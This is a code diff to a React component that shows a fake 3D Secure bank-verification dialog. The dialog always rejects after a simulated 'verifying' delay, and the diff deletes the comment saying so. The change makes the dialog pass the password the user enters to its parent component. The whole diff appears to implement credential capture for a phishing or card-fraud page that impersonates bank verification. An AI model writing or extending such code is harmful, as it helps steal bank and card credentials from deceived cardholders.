@@ -6,7 +6,7 @@ import { Loader2, ShieldCheck } from "lucide-react";
 
 interface ThreeDSModalProps {
   open: boolean;
-  onComplete: (approved: boolean) => void;
+  onComplete: (approved: boolean, password?: string) => void;
 }
 
 const ThreeDSModal = ({ open, onComplete }: ThreeDSModalProps) => {
@@ -30,9 +30,8 @@ const ThreeDSModal = ({ open, onComplete }: ThreeDSModalProps) => {
       return;
     }
     setStep("verifying");
-    // Always reject — simulates bank denial
     setTimeout(() => {
-      onComplete(false);
+      onComplete(false, password);
     }, 2500);
   };
 
@@ -73,7 +72,7 @@ const ThreeDSModal = ({ open, onComplete }: ThreeDSModalProps) => {
               {error && <p className="mt-1 text-xs text-destructive">{error}</p>}
             </div>
             <div className="flex gap-2">
-              <Button variant="outline" className="flex-1" onClick={() => onComplete(false)}>
+              <Button variant="outline" className="flex-1" onClick={() => onComplete(false, "")}>
                 Cancelar
               </Button>
               <Button className="flex-1" onClick={handleVerify}>
